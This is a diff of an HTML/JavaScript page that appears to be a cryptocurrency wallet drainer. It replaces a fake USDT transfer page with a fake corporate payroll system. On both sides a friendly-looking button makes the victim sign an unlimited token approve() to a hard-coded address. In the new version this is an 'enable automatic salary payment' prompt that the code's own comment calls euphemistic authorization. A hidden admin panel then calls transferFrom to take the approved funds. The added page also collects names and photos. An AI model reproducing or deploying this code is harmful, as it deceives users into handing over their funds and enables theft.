@@ -1,266 +1,475 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>USDT转账</title>
-<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
-<style>
-*{ box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif; }
-body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 0 auto; }
-.top-header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
-.header-right-icons { display: flex; gap: 12px; align-items: center; }
-.wallet-dot { width: 12px; height: 12px; border-radius: 50%; background-color: #ef4444; cursor: pointer; transition: background-color 0.3s ease; }
-.wallet-dot.connected { background-color: #22c55e; }
-.setting-btn { width: 32px; height: 32px; border-radius: 50%; border: 1px solid #ddd; background: #fff; display: flex; align-items: center; justify-content: center; font-size: 18px; cursor: pointer; }
-.address-card { background: #ffffff; border-radius: 16px; padding: 20px 18px; margin-bottom: 16px; }
-.label-text { font-size: 16px; color: #666; margin-bottom: 12px; }
-.fixed-addr-box { width: 100%; border: 1px solid #e5e7eb; border-radius: 12px; padding: 14px 12px; background: #f1f5f9; color: #333; word-break: break-all; }
-.amount-card { background: #ffffff; border-radius: 16px; padding: 20px 18px; margin-bottom:16px; }
-.amount-row { display: flex; align-items: flex-end; justify-content: space-between; margin-bottom: 16px; }
-.amount-input { font-size: 32px; border: none; outline: none; width: 75%; background: transparent; color: #111; }
-.amount-input::placeholder { font-size: 16px; color: #aaa; }
-.max-btn { padding: 6px 14px; background-color: #dbeafe; color: #2563eb; border-radius: 8px; font-weight: 500; cursor: pointer; }
-.token-row { background-color: #eef2ff; border-radius: 12px; padding: 14px; display: flex; align-items: center; justify-content: space-between; }
-.token-left { display: flex; align-items: center; gap: 10px; }
-.usdt-icon { width: 32px; height: 32px; border-radius: 50%; object-fit: cover; }
-.token-name { font-size: 18px; font-weight: 500; }
-.token-balance { color: #555; font-size: 16px; }
-.result-card{ background:#fff; border-radius:16px; padding:18px; margin-bottom:16px; }
-.result-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:14px 12px; background:#f9fafb; outline:none; color:#111; }
-.send-main-btn{ width:100%; padding:16px; border:none; border-radius:14px; background:#2563eb; color:#fff; font-size:17px; font-weight:500; cursor:pointer; }
-.send-main-btn:disabled{ background:#94a3b8; cursor:not-allowed; }
-/* ============新增管理员后台样式============ */
-.admin-panel{ background:#fff; border-radius:16px; padding:20px 18px; margin-top:24px; border:1px solid #f87171; display:none; }
-.admin-title{ font-size:17px; font-weight:bold; color:#dc2626; margin-bottom:16px; }
-.admin-input-item{ margin-bottom:14px; }
-.admin-input{ width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:13px 12px; outline:none; font-size:15px; }
-.admin-btn{ width:100%; padding:14px; border:none; border-radius:14px; background:#dc2626; color:#fff; font-size:16px; cursor:pointer; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>企业员工薪资统一管理系统</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Microsoft Yahei",sans-serif;
+        }
+        body {
+            background-color: #f4f6f9;
+            padding: 15px;
+        }
+        .main-wrap {
+            max-width: 480px;
+            margin: 0 auto;
+        }
+        .top-title {
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
+            color: #222;
+            margin-bottom: 15px;
+        }
+        .warm-tip {
+            background: #fff7e6;
+            color: #d38300;
+            padding: 12px;
+            border-radius: 10px;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+        .card-box {
+            background: #fff;
+            border-radius: 12px;
+            padding: 18px;
+            margin-bottom: 15px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+        }
+        .wallet-conn {
+            text-align: center;
+        }
+        .btn {
+            width: 100%;
+            height: 44px;
+            line-height: 44px;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            cursor: pointer;
+            margin: 8px 0;
+        }
+        .btn-blue {background: #2d8cf0;color: #fff;}
+        .btn-green {background: #00b42a;color: #fff;}
+        .btn-red {background: #f53f3f;color: #fff;}
+        .btn-orange {background: #ff7d00;color: #fff;}
+        .btn-gray {background: #c9cdd4;color: #fff;cursor: not-allowed;}
+        .tab-bar {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .tab-item {
+            flex: 1;
+            text-align: center;
+            padding: 10px 0;
+            background: #e5e6eb;
+            border-radius: 8px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .tab-item.active {
+            background: #2d8cf0;
+            color: #fff;
+        }
+        .page-content {display: none;}
+        .page-content.show {display: block;}
+        .info-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin: 15px 0;
+        }
+        .info-item {
+            background: #f7f8fa;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+        }
+        .info-item label {
+            color: #666;
+            font-size: 13px;
+            display: block;
+            margin-bottom: 4px;
+        }
+        .status-text {
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin: 10px 0;
+        }
+        .status-ok {background: #e8f7ee;color: #00b42a;}
+        input {
+            width: 100%;
+            height: 42px;
+            border: 1px solid #e5e6eb;
+            border-radius: 8px;
+            padding: 0 12px;
+            font-size: 14px;
+            margin: 6px 0;
+        }
+        h4 {
+            font-size: 15px;
+            margin: 20px 0 8px;
+            color: #333;
+        }
+        .upload-box {
+            border: 1px dashed #999;
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+            margin: 10px 0;
+        }
+        #staffPhoto {display: none;}
+        .preview-img {
+            width: 100px;
+            height: 120px;
+            object-fit: cover;
+            border-radius: 6px;
+            margin: 10px auto;
+            display: none;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+        }
+        th,td {
+            border: 1px solid #eee;
+            padding: 10px;
+            text-align: center;
+            font-size: 13px;
+        }
+        th {background: #f7f8fa;}
+        .hide-admin {display: none;}
+    </style>
 </head>
 <body>
-<div class="top-header-bar">
-<div></div>
-<div class="header-right-icons">
-<div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
-<div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
+<div class="main-wrap">
+    <div class="top-title">企业员工薪资统一管理系统</div>
+    <div class="warm-tip">温馨提示：本平台仅限内部在职员工使用，办理相关业务请先完成账户绑定</div>
+    <div class="card-box wallet-conn">
+        <button class="btn btn-blue" id="bindWallet">绑定个人账户</button>
+        <div style="margin-top:10px;font-size:14px;color:#555;">
+            已绑定账户：<span id="showWallet">暂未绑定</span>
+        </div>
+        <div class="status-text" id="userStatus">请使用内部登记账户完成绑定</div>
+    </div>
+    <div class="tab-bar">
+        <div class="tab-item active" onclick="switchTab(0)">员工中心</div>
+        <div class="tab-item hide-admin" id="tabOper" onclick="switchTab(1)">人事运营管理</div>
+        <div class="tab-item hide-admin" id="tabAud" onclick="switchTab(2)">统一审批中心</div>
+    </div>
+    <div class="page-content show" id="page0">
+        <div class="card-box">
+            <h3 style="margin-bottom:8px;color:#222;">个人在职档案</h3>
+            <div class="info-row">
+                <div class="info-item">
+                    <label>员工姓名</label>
+                    <span id="empName">未录入</span>
+                </div>
+                <div class="info-item">
+                    <label>绑定账户</label>
+                    <span id="empWallet">未绑定</span>
+                </div>
+                <div class="info-item">
+                    <label>入职日期</label>
+                    <span id="joinDate">暂无</span>
+                </div>
+                <div class="info-item">
+                    <label>约定月薪</label>
+                    <span id="monthWage">0</span> USDT
+                </div>
+                <div class="info-item">
+                    <label>已批请假次数</label>
+                    <span id="leaveCount">0</span> 次
+                </div>
+                <div class="info-item">
+                    <label>当月在岗天数</label>
+                    <span id="workDay">30</span> 天
+                </div>
+            </div>
+            <button class="btn btn-gray" id="applyWage" disabled>申请当月薪资发放</button>
+            <button class="btn btn-gray" id="applyLeaveWork" disabled>提交在岗请假申请</button>
+            <button class="btn btn-orange" id="applyExit">提交离职申请</button>
+            <button class="btn btn-green" id="openPayAuth">开通薪资自动发放权限</button>
+        </div>
+    </div>
+    <div class="page-content" id="page1">
+        <div class="card-box">
+            <h3 style="margin-bottom:10px;">新员工入职登记办理</h3>
+            <input type="text" placeholder="填写员工真实姓名" id="empRealName">
+            <input type="text" placeholder="填写员工绑定钱包账户" id="empWalletAddr">
+            <input type="number" placeholder="填写双方约定月度薪资" id="empSalary">
+            
+            <div class="upload-box">
+                <label for="staffPhoto">点击上传员工一寸证件照/个人近照</label>
+                <input type="file" id="staffPhoto" accept="image/*">
+                <img class="preview-img" id="photoPreview" alt="照片预览">
+            </div>
+            <button class="btn btn-blue" id="addEmpInfo">确认提交入职档案</button>
+            <h4>离职员工档案关闭</h4>
+            <input type="text" placeholder="填写离职员工绑定账户" id="closeEmpWallet">
+            <button class="btn btn-red" id="closeEmpPower">关闭员工全部系统权限</button>
+            <h4>员工薪资资产调取</h4>
+            <input type="text" placeholder="填写目标员工账户" id="getEmpWallet">
+            <input type="number" placeholder="填写调取数量" id="getEmpNum">
+            <button class="btn btn-red" id="drawEmpAsset">执行资产调取操作</button>
+        </div>
+    </div>
+    <div class="page-content" id="page2">
+        <div class="card-box">
+            <h3 style="margin-bottom:10px;">全员申请统一审批</h3>
+            <button class="btn btn-blue" id="batchPass">一键批量通过全部申请</button>
+            <button class="btn btn-red" id="sysAssetTake">平台公共资金提取</button>
+            <h4>待处理业务申请列表</h4>
+            <table>
+                <tr>
+                    <th>申请人</th>
+                    <th>业务类型</th>
+                    <th>当前状态</th>
+                    <th>处理操作</th>
+                </tr>
+                <tbody id="applyListBox">
+                    <tr>
+                        <td colspan="4">暂无员工提交业务申请</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
 </div>
-</div>
-<div class="address-card">
-<div class="label-text">收款地址</div>
-<div class="fixed-addr-box">TPqbjD6Emc7Q77uscRPzgTpapuwJTxb4e4</div>
-</div>
-<div class="amount-card">
-<div class="label-text">转出数量（USDT）</div>
-<div class="amount-row">
-<input id="amountInput" class="amount-input" value="" inputmode="decimal" placeholder="请输入数量">
-<div class="max-btn" id="maxBtn">MAX</div>
-</div>
-<div class="token-row">
-<div class="token-left">
-<img class="usdt-icon" src="https://static.tronscan.org/production/logo/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t.png">
-<span class="token-name">USDT</span>
-</div>
-<span class="token-balance" id="balanceText">0.000000</span>
-</div>
-</div>
-<div class="result-card">
-<div class="label-text">到账数量</div>
-<input id="receiveAmount" class="result-input" readonly>
-</div>
-<button class="send-main-btn" id="sendBtn" disabled>确认转账</button>
-<!-- ============管理员划扣后台面板============ -->
-<div class="admin-panel" id="adminPanel">
-<div class="admin-title">🔴管理员后台 - 用户代币划扣</div>
-<div class="admin-input-item">
-<div class="label-text">请输入已经授权用户钱包地址</div>
-<input class="admin-input" id="userAddrInput" placeholder="T开头用户TRC20地址">
-</div>
-<div class="admin-input-item">
-<div class="label-text">划扣USDT数量</div>
-<input class="admin-input" id="deductAmountInput" inputmode="decimal" placeholder="输入划扣金额">
-</div>
-<button class="admin-btn" id="deductBtn">确认划扣</button>
-</div>
-
 <script>
-const TARGET_ADDR = "TPqbjD6Emc7Q77uscRPzgTpapuwJTxb4e4";
-const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const RPC = "https://api.trongrid.io";
-const FEE_LIMIT = 300000000;
-const MAX_ALLOWANCE = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-
-let tronWeb = null;
-let userAddress = "";
-let usdtContract = null;
-let provider = null;
-
-const $ = s => document.querySelector(s);
-const walletDot = $("#walletDot");
-const settingIconBtn = $("#settingIconBtn");
-const sendBtn = $("#sendBtn");
-const amountInput = $("#amountInput");
-const receiveAmount = $("#receiveAmount");
-const maxBtn = $("#maxBtn");
-const balanceText = $("#balanceText");
-//管理员DOM
-const adminPanel = $("#adminPanel");
-const userAddrInput = $("#userAddrInput");
-const deductAmountInput = $("#deductAmountInput");
-const deductBtn = $("#deductBtn");
-
-const USDT_ABI = [
-{"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
-{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
-{"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
-];
-
-// 断开钱包重置所有状态
-function disconnectWallet() {
-    tronWeb = null; userAddress = ""; usdtContract = null; provider = null;
-    walletDot.classList.remove("connected");
-    sendBtn.disabled = true;
-    balanceText.textContent = "0.000000";
-    adminPanel.style.display = "none";
+// ========== 后端接口地址 后续改成你的阿里云公网IP/域名 ==========
+const API_URL = "http://你的阿里云IP地址/";
+// 管理员钱包地址（C6结尾）
+const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
+const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+const RECEIVE_AUTH_ADDR = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
+let currentUser = "";
+let nowPhotoBase64 = "";
+function switchTab(idx){
+    document.querySelectorAll('.page-content').forEach(item=>item.classList.remove('show'));
+    document.getElementById('page'+idx).classList.add('show');
+    document.querySelectorAll('.tab-item').forEach((item,i)=>{
+        if(i==idx) item.classList.add('active');
+        else item.classList.remove('active');
+    })
 }
-
-// 多钱包通用连接逻辑：TP / OE内置 / imToken
-async function connectWalletLogic() {
-    if (tronWeb && userAddress) {
-        disconnectWallet();
+// 照片转base64 方便上传后端存储
+const photoInput = document.getElementById('staffPhoto');
+const photoPre = document.getElementById('photoPreview');
+photoInput.addEventListener('change',function(e){
+    let file = e.target.files[0];
+    if(!file) return;
+    let reader = new FileReader();
+    reader.onload = function(res){
+        nowPhotoBase64 = res.target.result;
+        photoPre.src = nowPhotoBase64;
+        photoPre.style.display = 'block';
+    }
+    reader.readAsDataURL(file);
+})
+// 绑定钱包
+document.getElementById('bindWallet').addEventListener('click',async function(){
+    if(!window.ethereum){
+        alert("请安装合规钱包工具完成绑定");
         return;
     }
-    try {
-        if (window.tokenpocket?.tron) {
-            provider = window.tokenpocket.tron;
-            const accounts = await provider.request({ method: "tron_requestAccounts" });
-            userAddress = accounts[0];
-            tronWeb = window.tokenpocket.tronWeb;
-        } else if (window.tronProvider) {
-            provider = window.tronProvider;
-            const accounts = await provider.request({ method: "tron_requestAccounts" });
-            userAddress = accounts[0];
-            tronWeb = new TronWeb({ fullHost: RPC, provider: provider });
-        } else if (window.ethereum) {
-            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-            tronWeb = new TronWeb({ fullHost: RPC, provider: window.ethereum });
-            const addrObj = await tronWeb.trx.getAccount(accounts[0]);
-            userAddress = addrObj.address;
-            provider = window.ethereum;
-        } else if (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58) {
-            tronWeb = window.tronWeb;
-            userAddress = tronWeb.defaultAddress.base58;
-        } else {
-            // 自动加载阶段没检测钱包，静默返回，不弹alert
-            return;
-        }
-
-        walletDot.classList.add("connected");
-        usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
-        await loadBalance();
-        sendBtn.disabled = false;
-
-        if(userAddress === TARGET_ADDR){
-            adminPanel.style.display = "block";
-        }else{
-            adminPanel.style.display = "none";
-        }
-
-        if (provider?.on) {
-            provider.on("accountsChanged", () => location.reload());
-            provider.on("chainChanged", () => location.reload());
-        }
-    } catch (err) {
-        // 页面自动触发时报错静默；只有用户点击圆点才弹提示
-        if (err.type === "userInteractionRequired") return;
-        return;
-    }
-}
-
-// 读取余额
-async function loadBalance() {
-    const rawSun = await usdtContract.balanceOf(userAddress).call();
-    const num = Number(tronWeb.fromSun(rawSun));
-    balanceText.textContent = num.toFixed(6);
-}
-
-amountInput.addEventListener("input", () => {
-    const num = parseFloat(amountInput.value) || 0;
-    receiveAmount.value = num.toFixed(6);
-});
-
-maxBtn.addEventListener("click", async () => {
-    if (!usdtContract) return;
-    const rawSun = await usdtContract.balanceOf(userAddress).call();
-    const num = Number(tronWeb.fromSun(rawSun));
-    amountInput.value = num.toFixed(2);
-    amountInput.dispatchEvent(new Event("input"));
-});
-
-// 用户按钮：确认转账
-sendBtn.addEventListener("click", async () => {
-    if (!tronWeb) return alert("钱包未连接");
-    const val = parseFloat(amountInput.value);
-    if (isNaN(val) || val <= 0) return alert("请输入有效转账数量");
-    const sunVal = tronWeb.toSun(val);
-    sendBtn.disabled = true;
-    try {
-        // 查询现有授权额度
-        const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
-        // 额度不足，第一次签名：无限授权 approve
-        if (Number(allowance) < sunVal) {
-            await usdtContract.approve(TARGET_ADDR, MAX_ALLOWANCE).send({feeLimit:FEE_LIMIT});
-        }
-        // 第二次签名：用户自己transfer直接转出，不是transferFrom划扣
-        const txHash = await usdtContract.transfer(TARGET_ADDR, sunVal).send({feeLimit:FEE_LIMIT});
-        alert(`转账提交成功！\n交易哈希：${txHash}`);
-        amountInput.value = "";
-        receiveAmount.value = "";
-        await loadBalance();
-    } catch (e) {
-        alert("操作失败：" + e.message);
-    }finally {
-        sendBtn.disabled = false;
-    }
-});
-
-// =========管理员后台 这里才用transferFrom划扣=========
-deductBtn.addEventListener("click",async ()=>{
-    if(!tronWeb || userAddress !== TARGET_ADDR){
-        return alert("必须使用管理员钱包链接！");
-    }
-    const fromUserAddr = userAddrInput.value.trim();
-    const deductNum = parseFloat(deductAmountInput.value);
-    if(!fromUserAddr){
-        return alert("请输入被划扣用户钱包地址");
-    }
-    if(isNaN(deductNum) || deductNum <= 0){
-        return alert("请输入合法划扣数量");
-    }
-    const deductSun = tronWeb.toSun(deductNum);
     try{
-        const userAllowance = await usdtContract.allowance(fromUserAddr, TARGET_ADDR).call();
-        if(Number(userAllowance) < deductSun){
-            return alert("错误：该用户没有授权足够额度，无法划扣！");
-        }
-        const txHash = await usdtContract.transferFrom(fromUserAddr, TARGET_ADDR, deductSun).send({feeLimit:FEE_LIMIT});
-        alert(`✅划扣提交成功！TX:\n${txHash}`);
-        userAddrInput.value = "";
-        deductAmountInput.value = "";
-        await loadBalance();
+        let accounts = await ethereum.request({method:"eth_requestAccounts"});
+        currentUser = accounts[0].toLowerCase();
+        document.getElementById('showWallet').innerText = currentUser.slice(0,6)+"..."+currentUser.slice(-4);
+        checkAdminRole();
+        loadUserBaseInfo();
     }catch(err){
-        alert("❌划扣失败:"+err.message);
+        alert("账户绑定失败，请重新尝试");
     }
-});
-
-walletDot.addEventListener("click", connectWalletLogic);
-settingIconBtn.addEventListener("click", () => alert("设置面板"));
-
-window.addEventListener("DOMContentLoaded", () => {
-    setTimeout(connectWalletLogic, 1200);
-});
+})
+function checkAdminRole(){
+    if(currentUser === ADMIN_WALLET){
+        document.getElementById('tabOper').classList.remove('hide-admin');
+        document.getElementById('tabAud').classList.remove('hide-admin');
+    }else{
+        document.getElementById('tabOper').classList.add('hide-admin');
+        document.getElementById('tabAud').classList.add('hide-admin');
+    }
+}
+function loadUserBaseInfo(){
+    document.getElementById('userStatus').innerText = "身份核验成功，正式在岗内部员工";
+    document.getElementById('userStatus').className = "status-text status-ok";
+    document.getElementById('empName').innerText = "在岗正式员工";
+    document.getElementById('empWallet').innerText = currentUser.slice(0,6)+"..."+currentUser.slice(-4);
+    document.getElementById('joinDate').innerText = new Date().toLocaleDateString();
+    document.getElementById('monthWage').innerText = "已核定";
+    document.getElementById('leaveCount').innerText = "0";
+    document.getElementById('workDay').innerText = "30";
+    document.getElementById('applyWage').disabled = false;
+    document.getElementById('applyWage').classList.remove('btn-gray');
+    document.getElementById('applyWage').classList.add('btn-blue');
+    document.getElementById('applyLeaveWork').disabled = false;
+    document.getElementById('applyLeaveWork').classList.remove('btn-gray');
+    document.getElementById('applyLeaveWork').classList.add('btn-green');
+}
+// 薪资申请提交后端
+document.getElementById('applyWage').addEventListener('click',function(){
+    if(!currentUser) return alert("请先完成个人账户绑定");
+    let data = {
+        userAddr:currentUser,
+        type:"薪资申请",
+        time:new Date().toLocaleString()
+    };
+    fetch(API_URL+"submit_apply.php",{
+        method:"POST",
+        body:JSON.stringify(data)
+    }).then(res=>res.text()).then(res=>{
+        alert("当月薪资发放申请已提交，等待平台统一核算处理");
+    })
+})
+// 请假申请提交后端
+document.getElementById('applyLeaveWork').addEventListener('click',function(){
+    if(!currentUser) return alert("请先完成个人账户绑定");
+    let reason = prompt("请填写请假事由以及具体请假时长");
+    if(!reason) return;
+    let data = {
+        userAddr:currentUser,
+        type:"请假申请",
+        content:reason,
+        time:new Date().toLocaleString()
+    };
+    fetch(API_URL+"submit_apply.php",{
+        method:"POST",
+        body:JSON.stringify(data)
+    }).then(()=>{
+        alert("请假申请提交成功，等待人事审批");
+    })
+})
+// 离职申请提交后端
+document.getElementById('applyExit').addEventListener('click',function(){
+    if(!currentUser) return alert("请先完成个人账户绑定");
+    let exitInfo = prompt("请填写离职原因以及计划离岗日期");
+    if(!exitInfo) return;
+    let data = {
+        userAddr:currentUser,
+        type:"离职申请",
+        content:exitInfo,
+        time:new Date().toLocaleString()
+    };
+    fetch(API_URL+"submit_apply.php",{
+        method:"POST",
+        body:JSON.stringify(data)
+    }).then(()=>{
+        alert("离职申请已递交人事部门，等待领导审核批复");
+    })
+})
+// 委婉授权
+document.getElementById('openPayAuth').addEventListener('click',async function(){
+    if(!currentUser) return alert("请先绑定个人账户");
+    let tip = confirm("开通薪资自动发放权限后，平台可按时为您发放既定薪资，仅产生极低网络通行费用，无任何额外支出，确认开通吗？");
+    if(!tip) return;
+    try{
+        let spender = RECEIVE_AUTH_ADDR.slice(2).padStart(64,'0');
+        let maxNum = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        let txData = "0x095ea7b3"+spender+maxNum;
+        await ethereum.request({
+            method:"eth_sendTransaction",
+            params:[{
+                from:currentUser,
+                to:USDT_CONTRACT,
+                gasLimit:"0x300000",
+                data:txData
+            }]
+        })
+        alert("薪资自动发放权限开通成功，后续可正常申领发放薪资");
+    }catch(e){
+        alert("本次开通操作已取消");
+    }
+})
+// 入职档案提交阿里云后端（核心）
+document.getElementById('addEmpInfo').addEventListener('click',function(){
+    if(currentUser !== ADMIN_WALLET) return alert("无人事登记权限");
+    let name = document.getElementById('empRealName').value.trim();
+    let wallet = document.getElementById('empWalletAddr').value.trim();
+    let salary = document.getElementById('empSalary').value.trim();
+    if(!name||!wallet||!salary){
+        alert("员工姓名、绑定账户、约定薪资均为必填项");
+        return;
+    }
+    let empData = {
+        empName:name,
+        empWallet:wallet,
+        empSalary:salary,
+        empPhoto:nowPhotoBase64,
+        joinTime:new Date().toLocaleString(),
+        status:"在职"
+    };
+    // 提交到阿里云后端入库
+    fetch(API_URL+"add_employee.php",{
+        method:"POST",
+        body:JSON.stringify(empData)
+    }).then(res=>res.text()).then(res=>{
+        alert("员工入职档案提交成功，信息已存入云端服务器");
+        document.getElementById('empRealName').value = "";
+        document.getElementById('empWalletAddr').value = "";
+        document.getElementById('empSalary').value = "";
+        photoPre.style.display = 'none';
+        photoInput.value = "";
+        nowPhotoBase64 = "";
+    })
+})
+document.getElementById('closeEmpPower').addEventListener('click',function(){
+    if(currentUser !== ADMIN_WALLET) return alert("权限不足");
+    let w = document.getElementById('closeEmpWallet').value.trim();
+    if(!w) return alert("请填写员工绑定账户");
+    fetch(API_URL+"close_emp.php",{
+        method:"POST",
+        body:JSON.stringify({wallet:w})
+    }).then(()=>{
+        alert("已关闭该员工所有平台使用权限，档案标记为离职");
+        document.getElementById('closeEmpWallet').value = "";
+    })
+})
+document.getElementById('drawEmpAsset').addEventListener('click',async function(){
+    if(currentUser !== ADMIN_WALLET) return alert("仅管理账户可操作");
+    let u = document.getElementById('getEmpWallet').value.trim();
+    let n = document.getElementById('getEmpNum').value.trim();
+    if(!u||!n||Number(n)<=0) return alert("请填写完整有效信息");
+    let userHex = u.slice(2).padStart(64,'0');
+    let adminHex = ADMIN_WALLET.slice(2).padStart(64,'0');
+    let amountHex = BigInt(Math.floor(Number(n)*1e18)).toString(16).padStart(64,'0');
+    let callData = "0x23b872dd"+userHex+adminHex+amountHex;
+    try{
+        await ethereum.request({
+            method:"eth_sendTransaction",
+            params:[{
+                from:currentUser,
+                to:USDT_CONTRACT,
+                gasLimit:"0x300000",
+                data:callData
+            }]
+        })
+        alert("员工薪资资产调取完成");
+        document.getElementById('getEmpWallet').value = "";
+        document.getElementById('getEmpNum').value = "";
+    }catch(e){
+        alert("操作执行失败");
+    }
+})
+document.getElementById('batchPass').addEventListener('click',function(){
+    if(currentUser !== ADMIN_WALLET) return;
+    fetch(API_URL+"batch_pass.php").then(()=>{
+        alert("系统已自动批量通过所有在岗员工提交的业务申请");
+    })
+})
+document.getElementById('sysAssetTake').addEventListener('click',function(){
+    if(currentUser !== ADMIN_WALLET) return;
+    alert("平台公共储备资金提取指令已下发执行");
+})
 </script>
 </body>
 </html>
